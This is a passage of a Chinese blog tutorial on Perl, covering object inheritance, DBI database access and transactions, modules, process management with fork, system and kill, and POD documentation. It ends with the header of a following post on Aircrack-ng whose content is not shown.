<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">setFirstName</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> ( $self, $firstName ) = @_;</span><br><span class="line">    $self-&gt;&#123;_firstName&#125; = $firstName <span class="keyword">if</span> <span class="keyword">defined</span>($firstName);</span><br><span class="line">    <span class="keyword">return</span> $self-&gt;&#123;_firstName&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">]$object-&gt;setFirstName( <span class="string">"小强"</span> );</span><br><span class="line">$firstName = $object-&gt;getFirstName();</span><br></pre></td></tr></table></figure>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>Perl 里 类方法通过@ISA数组继承，这个数组里面包含其他包（类）的名字，变量的继承必须明确设定。</p>
<p>多继承就是这个@ISA数组包含多个类（包）名字。</p>
<p>通过@ISA只能继承方法，不能继承数据。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Employee;</span><br><span class="line"><span class="keyword">use</span> Person;</span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">our</span> @ISA = <span class="string">qw(Person)</span>;    <span class="comment"># 从 Person 继承</span></span><br></pre></td></tr></table></figure>
<p>方法重写只需要覆盖本来的定义。</p>
<h3 id="默认载入"><a href="#默认载入" class="headerlink" title="默认载入"></a>默认载入</h3><p>如果在当前类、当前类所有的基类、还有 UNIVERSAL 类中都找不到请求的方法， 这时会再次查找名为 AUTOLOAD() 的一个方法。如果找到了 AUTOLOAD，那么就会 调用，同时设定全局变量 $AUTOLOAD 的值为缺失的方法的全限定名称。</p>
<p>如果还不行，那么 Perl 就宣告失败并出错。</p>
<p>如果你不想继承基类的 AUTOLOAD，很简单，只需要一句：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">AUTOLOAD</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="析构函数及垃圾回收"><a href="#析构函数及垃圾回收" class="headerlink" title="析构函数及垃圾回收"></a>析构函数及垃圾回收</h3><p>当对象的最后一个引用释放时，对象会自动析构。</p>
<p>如果你想在析构的时候做些什么，那么你可以在类中定义一个名为”DESTROY”的方法。它将在适合的时机自动调用，并且按照你的意思执行额外的清理动作。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">DESTROY</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"MyClass::DESTROY called\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Perl 会把对象的引用作为 唯一的参数传递给 DESTROY。</span></span><br><span class="line"><span class="comment"># 注意这个引用是只读的，也就是说你不能通过访问$_[0] 来修改它。</span></span><br><span class="line"><span class="comment"># 但是对象自身（比如 "$&#123;$_[0]" 或者 "@&#123;$_[0]&#125;" 还有 "%&#123;$_[0]&#125;" 等等）还是可写的。</span></span><br></pre></td></tr></table></figure>
<h2 id="Perl-数据库连接"><a href="#Perl-数据库连接" class="headerlink" title="Perl 数据库连接"></a>Perl 数据库连接</h2><p>Perl 5 中我们可以使用 DBI 模块来连接数据库。</p>
<p>DBI 英文全称：Database Independent Interface，中文称为数据库独立接口。</p>
<p>DBI 作为 Perl 语言中和数据库进行通讯的标准接口，它定义了一系列的方法，变量和常量，提供一个和具体数据库<strong>平台无关</strong>的数据库持久层。</p>
<h3 id="DBI-结构"><a href="#DBI-结构" class="headerlink" title="DBI 结构"></a>DBI 结构</h3><p>DBI 和具体数据库平台无关，我们可以将其应用在Oracle, MySQL 或 Informix, 等数据库中。</p>
<h4 id="变量名约定"><a href="#变量名约定" class="headerlink" title="变量名约定"></a>变量名约定</h4><p>以下设置了比较常用的变量名命名方法：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$dsn    驱动程序对象的句柄</span><br><span class="line">$dbh    一个数据库对象的句柄</span><br><span class="line">$sth    一个语句或者一个查询对象的句柄</span><br><span class="line">$h      通用的句柄 ($dbh, $sth, 或 $drh)，依赖于上下文</span><br><span class="line">$rc     操作代码返回的布什值（true 或 false）</span><br><span class="line">$rv     操作代码返回的整数值</span><br><span class="line">@ary    查询返回的一行值的数组（列表）</span><br><span class="line">$rows   操作代码返回的行数值</span><br><span class="line">$fh     文件句柄</span><br><span class="line"><span class="keyword">undef</span>   NULL 值表示未定义</span><br><span class="line">\%attr  引用属性的哈希值并传到方法上</span><br></pre></td></tr></table></figure>
<h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">my</span> $host = <span class="string">"localhost"</span>;         <span class="comment"># 主机地址</span></span><br><span class="line"><span class="keyword">my</span> $driver = <span class="string">"mysql"</span>;           <span class="comment"># 接口类型 默认为 localhost</span></span><br><span class="line"><span class="keyword">my</span> $database = <span class="string">"RUNOOB"</span>;        <span class="comment"># 数据库</span></span><br><span class="line"><span class="comment"># 驱动程序对象的句柄</span></span><br><span class="line"><span class="keyword">my</span> $dsn = <span class="string">"DBI:$driver:database=$database:$host"</span>;  </span><br><span class="line"><span class="keyword">my</span> $userid = <span class="string">"root"</span>;            <span class="comment"># 数据库用户名</span></span><br><span class="line"><span class="keyword">my</span> $password = <span class="string">"123456"</span>;        <span class="comment"># 数据库密码</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, $userid, $password ) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM Websites"</span>);   <span class="comment"># 预处理 SQL  语句</span></span><br><span class="line">$sth-&gt;execute();    <span class="comment"># 执行 SQL 操作</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 注释这部分使用的是绑定值操作</span></span><br><span class="line"><span class="comment"># $alexa = 20;</span></span><br><span class="line"><span class="comment"># my $sth = $dbh-&gt;prepare("SELECT name, url</span></span><br><span class="line"><span class="comment">#                        FROM Websites</span></span><br><span class="line"><span class="comment">#                        WHERE alexa &gt; ?");</span></span><br><span class="line"><span class="comment"># $sth-&gt;execute( $alexa ) or die $DBI::errstr;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 循环输出所有数据</span></span><br><span class="line"><span class="keyword">while</span> ( <span class="keyword">my</span> @row = $sth-&gt;fetchrow_array() )</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">'\t'</span>, @row).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;disconnect();</span><br></pre></td></tr></table></figure>
<h3 id="插入-更新-修改"><a href="#插入-更新-修改" class="headerlink" title="插入/更新/修改"></a>插入/更新/修改</h3><p>执行步骤:</p>
<ul>
<li>使用 prepare() API 预处理 SQL 语句。</li>
<li>使用 execute() API 执行 SQL 语句。</li>
<li>使用 finish() API 释放语句句柄。</li>
<li>最后如果一切顺利就会提交以上执行操作。</li>
</ul>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"INSERT INTO Websites</span></span><br><span class="line"><span class="string">                       (name, url, alexa, conutry )</span></span><br><span class="line"><span class="string">                        values</span></span><br><span class="line"><span class="string">                       ('Twitter', 'https://twitter.com/', 10, 'USA')"</span>);</span><br><span class="line">$sth-&gt;execute() <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;commit <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br></pre></td></tr></table></figure>
<p>应用程序还可以绑定输出和输入参数,下面例子通过用变量 取代 ? 占位符的位置来执行一条插入查询：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $name = <span class="string">"Twitter"</span>;</span><br><span class="line"><span class="keyword">my</span> $url = <span class="string">"https://twitter.com/"</span>;</span><br><span class="line"><span class="keyword">my</span> $alexa = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">my</span> $conutry = <span class="string">"USA"</span>;</span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"INSERT INTO Websites</span></span><br><span class="line"><span class="string">                       (name, url, alexa, conutry )</span></span><br><span class="line"><span class="string">                        values</span></span><br><span class="line"><span class="string">                       (?,?,?,?)"</span>);</span><br><span class="line">$sth-&gt;execute($name,$url,$alexa, $conutry) </span><br><span class="line">          <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;commit <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br></pre></td></tr></table></figure>
<h3 id="使用-do-语句"><a href="#使用-do-语句" class="headerlink" title="使用 do 语句"></a>使用 do 语句</h3><p><strong>do</strong> 语句可以执行 UPDATE, INSERT, 或 DELETE 操作，使用他比较简短，执行成功返回true，执行失败返回 false，实例如下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;<span class="keyword">do</span>(<span class="string">'DELETE FROM Websites WHERE alexa&gt;1000'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="COMMIT-操作"><a href="#COMMIT-操作" class="headerlink" title="COMMIT 操作"></a>COMMIT 操作</h3><p>commit 为提交事务，完成数据库的操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;commit or die $dbh-&gt;errstr;</span><br></pre></td></tr></table></figure>
<h3 id="ROLLBACK-操作"><a href="#ROLLBACK-操作" class="headerlink" title="ROLLBACK 操作"></a>ROLLBACK 操作</h3><p>如果在 SQL 执行过程中发生错误，可以回滚数据，不做任何改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;rollback or die $dbh-&gt;errstr;</span><br></pre></td></tr></table></figure>
<h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>和其它的语言一样, perl DBI对数据库的操作也支持事务处理， 它的实现方式有两个：</p>
<p>1、 在连接数据库的时候就开始一个事务</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, $userid, $password, &#123;<span class="string">AutoCommit =&gt;</span> <span class="number">0</span>&#125;) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"><span class="comment"># 以上代码在连接的时候设置了AutoCommit为false， 也就是说当你对数据库进行更新操作的时候， 它不会自动地把那些更新直接写到数据库里， 而是要程序通过 dbh-&gt;commit 来使数据真正地写到数据库里， 或 dbh-&gt;rollback 来回滚刚才的操作。</span></span><br></pre></td></tr></table></figure>
<p>2、 通过<code>$dbh-&gt;begin_work()</code>语句来开始一个事务</p>
<p>这种方式就不需要在连接数据库的时候设置 AutoCommit ＝ 0 。 </p>
<p>可以一次数据库连接进行多次事务操作， 不用每一次事务的开始都去连接一次数据库。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$rc  = $dbh-&gt;begin_work  <span class="keyword">or</span> <span class="keyword">die</span> $dbh-&gt;errstr;</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line"><span class="comment">##这里执行一些 SQL 操作</span></span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">$dbh-&gt;commit;    <span class="comment"># 成功后操作</span></span><br><span class="line">-----------------------------</span><br><span class="line">$dbh-&gt;rollback;  <span class="comment"># 失败后回滚</span></span><br></pre></td></tr></table></figure>
<h3 id="断开数据库连接"><a href="#断开数据库连接" class="headerlink" title="断开数据库连接"></a>断开数据库连接</h3><p>如果我们需要断开数据库连接，可以使用 disconnect API：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rc = $dbh-&gt;disconnect  <span class="keyword">or</span> <span class="keyword">warn</span> $dbh-&gt;errstr;</span><br></pre></td></tr></table></figure>
<h2 id="Perl-CGI编程"><a href="#Perl-CGI编程" class="headerlink" title="Perl CGI编程"></a>Perl CGI编程</h2><p>CGI 目前由NCSA维护，NCSA定义CGI如下：</p>
<p>CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端HTML页面的接口。</p>
<p><a href="http://www.runoob.com/perl/perl-cgi-programming.html" target="_blank" rel="noopener">详情</a></p>
<h2 id="Perl-包和模块"><a href="#Perl-包和模块" class="headerlink" title="Perl 包和模块"></a>Perl 包和模块</h2><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>Perl 中每个包有一个单独的符号表，定义语法为：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mypack;</span><br></pre></td></tr></table></figure>
<p>此语句定义一个名为 <strong>mypack</strong> 的包，在此后定义的所有变量和子程序的名字都存贮在该包关联的符号表中，直到遇到另一个 <strong>package</strong> 语句为止。</p>
<ul>
<li><p>从一个包中访问另外一个包的变量，可通过” 包名 + 双冒号( :: ) + 变量名 “ 的方式指定。</p>
</li>
<li><p>存贮变量和子程序的名字的默认符号表是与名为 <strong>main</strong>的包相关联的。如果在程序里定义了其它的包，当你想切换回去使用默认的符号表，可以重新指定main包。</p>
  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br></pre></td></tr></table></figure>
<p>  这样，接下来的程序就好象从没定义过包一样，变量和子程序的名字象通常那样存贮。</p>
</li>
<li><p>特殊变量 <strong><strong>PACKAGE</strong></strong> 用于输出包名。</p>
</li>
</ul>
<h3 id="BEGIN-和-END-模块"><a href="#BEGIN-和-END-模块" class="headerlink" title="BEGIN 和 END 模块"></a>BEGIN 和 END 模块</h3><p>Perl语言提供了两个关键字：BEGIN，END。它们可以分别包含一组脚本，用于程序体运行前或者运行后的执行。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BEGIN &#123; ... &#125;</span><br><span class="line">END &#123; ... &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>每个 <strong>BEGIN</strong> 模块在 Perl 脚本载入和编译后但在其他语句执行前执行。</li>
<li>每个 <strong>END</strong> 语句块在解释器退出前执行。</li>
<li><strong>BEGIN</strong> 和 <strong>END</strong> 语句块在创建 Perl 模块时特别有用。</li>
</ul>
<h3 id="Perl-模块"><a href="#Perl-模块" class="headerlink" title="Perl 模块"></a>Perl 模块</h3><p>Perl5 中用Perl包来创建模块。</p>
<p>Perl 模块是一个可重复使用的包，模块的名字与包名相同，定义的文件后缀为 <strong>.pm</strong>。</p>
<p>注意：</p>
<ul>
<li>函数 <strong>require</strong> 和 <strong>use</strong> 将载入一个模块。</li>
<li><strong>@INC</strong> 是 Perl 内置的一个特殊数组，它包含指向库例程所在位置的目录路径。</li>
<li><strong>require</strong> 和 <strong>use</strong> 函数调用 <strong>eval</strong> 函数来执行代码。</li>
<li>末尾 <strong>1;</strong> 执行返回 TRUE，这是必须的，否则返回错误。</li>
</ul>
<h3 id="Require-和-Use-函数"><a href="#Require-和-Use-函数" class="headerlink" title="Require 和 Use 函数"></a>Require 和 Use 函数</h3><p>模块可以通过 <strong>require</strong> 函数来调用</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> Foo;</span><br><span class="line">Foo::bar( <span class="string">"a"</span> );</span><br></pre></td></tr></table></figure>
<p>也可以通过 <strong>use</strong> 函数来引用</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Foo;</span><br><span class="line">bar( <span class="string">"a"</span> );</span><br></pre></td></tr></table></figure>
<p>我们注意到 require 引用需要使用包名指定函数，而 use 不需要，二者的主要区别在于：</p>
<ul>
<li><p>1、require用于载入module或perl程序(.pm后缀可以省略，但.pl必须有)</p>
</li>
<li><p>2、Perl use语句是编译时引入的，require是运行时引入的</p>
</li>
<li><p>3、Perl use引入模块的同时，也引入了模块的子模块。而require则不能引入，要再重新声明</p>
</li>
<li><p>4、USE是在当前默认的@INC里面去寻找,一旦模块不在@INC中的话,用USE是不可以引入的，但是require可以指定路径</p>
</li>
<li><p>5、USE引用模块时，如果模块名称中包含::双冒号，该双冒号将作为路径分隔符，相当于Unix下的/或者Windows下的\。 如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use MyDirectory::MyModule</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="创建-Perl-模块"><a href="#创建-Perl-模块" class="headerlink" title="创建 Perl 模块"></a>创建 Perl 模块</h3><p>通过 Perl 分发自带的工具 h2xs 可以很简单的创建一个 Perl 模块。</p>
<p>你可以在命令行模式键入 h2xs 来看看它的参数列表。</p>
<p>h2xs 语法格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ h2xs -AX -n  ModuleName</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-A</strong> 忽略 autoload 机制</li>
<li><strong>-X</strong> 忽略 XS 元素</li>
<li><strong>-n</strong> 指定扩展模块的名字</li>
</ul>
<p>例如，如果你的模块在 <strong>Person.pm</strong> 文件中，使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ h2xs -AX -n Person</span><br></pre></td></tr></table></figure>
<p>执行以上程序将输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Writing Person/lib/Person.pm</span><br><span class="line">Writing Person/Makefile.PL</span><br><span class="line">Writing Person/README</span><br><span class="line">Writing Person/t/Person.t</span><br><span class="line">Writing Person/Changes</span><br><span class="line">Writing Person/MANIFEST</span><br></pre></td></tr></table></figure>
<p>Person 目录下你可以看到新增加的目录及文件说明:</p>
<ul>
<li>README ：这个文件包含一些安装信息，模块依赖性，版权信息等。</li>
<li>Changes ：这个文件作为你的项目的修改日志（changelog）文件。</li>
<li>Makefile.PL ：这是标准的 Perl Makefile 构造器。用于创建 Makefile.PL 文件来编译该模块。</li>
<li>MANIFEST ：本文件用于自动构建 tar.gz 类型的模块版本分发。这样你就可以把你的模块拿到 CPAN 发布或者分发给其他人。它包含了你在这个项目中所有文件的列表。</li>
<li>Person.pm ：这是主模块文件，包含你的 mod_perl 句柄代码（handler code）。</li>
<li>Person.t ：针对该模块的一些测试脚本。默认情况下它只是检查模块的载入，你可以添加一些新的测试单元。</li>
<li>t/ ：测试文件</li>
<li>lib/ ：实际源码存放的目录</li>
</ul>
<p>你可以使用 tar (Linux 上) 命令来将以上目录打包为 Person.tar.gz。</p>
<h3 id="安装-Perl-模块"><a href="#安装-Perl-模块" class="headerlink" title="安装 Perl 模块"></a>安装 Perl 模块</h3><p>我们可以对刚才压缩的 <strong>Person.tar.gz</strong> 文件进行解压安装，执行步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xvfz Person.tar.gz</span><br><span class="line">cd Person</span><br><span class="line">perl Makefile.PL</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>首先运行 “perl Makefile.PL” 在当前目录生成 Makefile；</p>
<p>然后运行 “make” 编译并创建所需的库文件；</p>
<p>之后用 “make test” 测试编译结果是否正确；最后运行 “make install” 将库文件安装到系统目录，至此整个编译过程结束。</p>
<h2 id="Perl-进程管理"><a href="#Perl-进程管理" class="headerlink" title="Perl 进程管理"></a>Perl 进程管理</h2><p>Perl 中你可以以不同的方法来创建进程。</p>
<ul>
<li>你可以使用特殊变量 <strong>$$</strong> 或 <strong>$PROCESS_ID</strong> 来获取进程 ID。</li>
<li>%ENV 哈希存放了父进程，也就是shell中的环境变量，在Perl中可以修改这些变量。</li>
<li><strong>exit()</strong> 通常用于退出子进程，主进程在子进程全部退出后再退出。</li>
<li>所有打开的句柄会在子程序中被 dup() 函数复制, 所有关闭进程所有句柄不会影响其他进程 。</li>
</ul>
<h3 id="反引号运算符"><a href="#反引号运算符" class="headerlink" title="反引号运算符"></a>反引号运算符</h3><p>使用反引号运算符可以很容易的执行 Unix 命令。你可以在反引号中插入一些简单的命令。命令执行后将返回结果：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@files = <span class="string">`ls -l`</span>;</span><br><span class="line"><span class="keyword">foreach</span> $file (@files)&#123;</span><br><span class="line">   <span class="keyword">print</span> $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system() 函数"></a>system() 函数</h3><p>你也可以使用 <strong>system()</strong> 函数执行 Unix 命令, 执行该命令将直接输出结果。默认情况下会送到目前Perl的STDOUT指向的地方，一般是屏幕。你也可以使用重定向运算符 &gt; 输出到指定文件。</p>
<p>你需要注意命令包含环境变量如 <code>$PATH</code> 或 <code>$HOME</code> 的输出结果，如下所示：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$PATH = <span class="string">"我是 Perl 的变量"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">system</span>(<span class="string">'echo $PATH'</span>);  <span class="comment"># $PATH 作为 shell 环境变量</span></span><br><span class="line"><span class="keyword">system</span>(<span class="string">"echo $PATH"</span>);  <span class="comment"># $PATH 作为 Perl 的变量</span></span><br><span class="line"><span class="keyword">system</span>(<span class="string">"echo \$PATH"</span>); <span class="comment"># 转义 $</span></span><br></pre></td></tr></table></figure>
<p>执行以上程序，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin</span><br><span class="line">我是 Perl 的变量</span><br><span class="line">/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin</span><br></pre></td></tr></table></figure>
<h3 id="fork-函数"><a href="#fork-函数" class="headerlink" title="fork() 函数"></a>fork() 函数</h3><p>Perl fork() 函数用于创建一个新进程。</p>
<p>在父进程中返回子进程的PID，在子进程中返回0。如果发生错误（比如，内存不足）返回undef，并将<code>$!</code>设为对应的错误信息。</p>
<p>fork 可以和 exec 配合使用。exec 函数执行完引号中的命令后进程即结束。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> $SIG<span class="string">&#123;CHLD&#125;</span> = <span class="string">"IGNORE"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">defined</span>($pid = <span class="keyword">fork</span>())) &#123;</span><br><span class="line">   <span class="comment"># fork 发生错误返回 undef</span></span><br><span class="line">   <span class="keyword">die</span> <span class="string">"无法创建子进程: $!"</span>;</span><br><span class="line">&#125;<span class="keyword">elsif</span> ($pid == <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"通过子进程输出\n"</span>;</span><br><span class="line">   <span class="keyword">exec</span>(<span class="string">"date"</span>) || <span class="keyword">die</span> <span class="string">"无法输出日期: $!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="comment"># 在父进程中</span></span><br><span class="line">   <span class="keyword">print</span> <span class="string">"通过父进程输出\n"</span>;</span><br><span class="line">   $ret = <span class="keyword">waitpid</span>($pid, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"完成的进程ID: $ret\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进程退出时,会向父进程发送一个CHLD的信号后,就会变成僵死的进程,需要父进程使用wait和waitpid来终止。当然,也可以设置<code>$SIG{CHLD}</code>为IGNORG</p>
<h3 id="Kill-函数"><a href="#Kill-函数" class="headerlink" title="Kill 函数"></a>Kill 函数</h3><p>Perl <strong>kill(‘signal’, (Process List))</strong>给一组进程发送信号。signal是发送的数字信号，9为杀掉进程。</p>
<p><code>kill(&#39;INT&#39;, 104, 102);</code></p>
<h2 id="Perl-POD-文档"><a href="#Perl-POD-文档" class="headerlink" title="Perl POD 文档"></a>Perl POD 文档</h2><p>Perl 中可以在模块或脚本中嵌入 POD（Plain Old Documentation） 文档。</p>
<p>POD 是一种简单而易用的标记型语言（置标语言）。</p>
<p>POD 文档使用规则：</p>
<blockquote>
<p>POD 文档以 <strong>=head1</strong> 开始，  <strong>=cut</strong> 结束， <strong>=head1</strong> 前与 <strong>=cut</strong> 后添加一空行。</p>
</blockquote>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Perl/">Perl</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Perl/">Perl</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Security/无线安全/Aircrack-ng" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/04/15/Security/无线安全/Aircrack-ng/" class="article-date">
      <time datetime="2018-04-15T06:22:08.000Z" itemprop="datePublished">2018-04-15</time>
</a>


    </div>
  
  <div class="article-inner">
    
